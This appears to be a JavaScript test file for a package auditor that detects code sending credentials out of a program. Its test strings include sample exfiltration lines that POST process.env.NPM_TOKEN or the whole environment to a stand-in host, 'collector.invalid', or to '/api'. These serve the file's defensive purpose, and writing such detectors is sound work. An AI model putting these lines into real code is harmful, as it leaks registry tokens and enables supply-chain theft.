'use strict';
const test = require('node:test');
const assert = require('node:assert/strict');
const { sensitiveFlowHints } = require('../src/sensitive-flows');
const { auditEvidence } = require('../src/auditor');

const payload = "fetch('https://collector.invalid',{method:'POST',body:process.env.NPM_TOKEN})";
test('credential export is a review signal rather than proof of malware', () => {
  const report = auditEvidence({ sourceFiles: { 'index.js': payload } });
  assert.equal(report.verdict, 'review');
  assert.ok(report.findings.some(f => f.category === 'credential-export'));
});
test('comments, quoted examples, regex patterns and unrelated health calls are not flows', () => {
  for (const source of [`// ${payload}`, `/* ${payload} */`, JSON.stringify(payload),
    "const pattern = /fetch\\(process.env.NPM_TOKEN\\)/;",
    "const token=process.env.NPM_TOKEN; fetch('https://service.invalid',{body:'ready'});",
    "const copy={...process.env}; fetch('https://service.invalid',{body:copy.NODE_ENV});",
    "let token=process.env.NPM_TOKEN; token='ready'; fetch('https://service.invalid',{body:token});"
  ]) assert.deepEqual(sensitiveFlowHints(source), [], source);
});
test('bracket properties, aliases and request streams preserve sensitive-flow hints', () => {
  for (const source of [payload.replace('process.env.NPM_TOKEN', "process['env']['NPM_TOKEN']"),
    "const e=process.env; fetch('https://collector.invalid',{body:JSON.stringify(e)});",
    "const token=process.env.NPM_TOKEN; const req=require('https').request('https://collector.invalid'); req.end(token);"
  ]) assert.equal(sensitiveFlowHints(source)[0].kind, 'credential-export');
});
test('nested and oversized input stays bounded and never executes supplied code', { timeout: 3000 }, () => {
  assert.ok(Array.isArray(sensitiveFlowHints('f('.repeat(40000) + payload + ')'.repeat(40000))));
  assert.ok(sensitiveFlowHints('/*' + 'x'.repeat(2 * 1024 * 1024)).some(h => h.kind === 'flow-analysis-gap'));
});

test('literal destructuring and reflection retain credentials without treating public properties as secrets', () => {
  for (const source of [
    "const {NPM_TOKEN: token}=process.env; fetch('/api', {body:token});",
    "const {NPM_TOKEN}=process.env; fetch('/api', {body:NPM_TOKEN});",
    "fetch('/api', {body:JSON.stringify(Reflect.get(process,'env'))});",
    "const e=Reflect.get(process,'env'); fetch('/api', {body:e.NPM_TOKEN});",
    "fetch('/api', {body:Reflect.get(process.env,'NPM_TOKEN')});"
  ]) assert.equal(sensitiveFlowHints(source)[0]?.kind, 'credential-export', source);
  for (const source of [
    "const {NODE_ENV: mode}=process.env; fetch('/api', {body:mode});",
    "fetch('/api', {body:Reflect.get(process.env,'NODE_ENV')});",
    "fetch('/api', {body:Reflect.get({status:'ready'},'status')});",
    "let {NPM_TOKEN: token}=process.env; token='public'; fetch('/api', {body:token});",
    "const {NPM_TOKEN: token='public'}=process.env; fetch('/api', {body:'ready'});"
  ]) assert.deepEqual(sensitiveFlowHints(source), [], source);
});
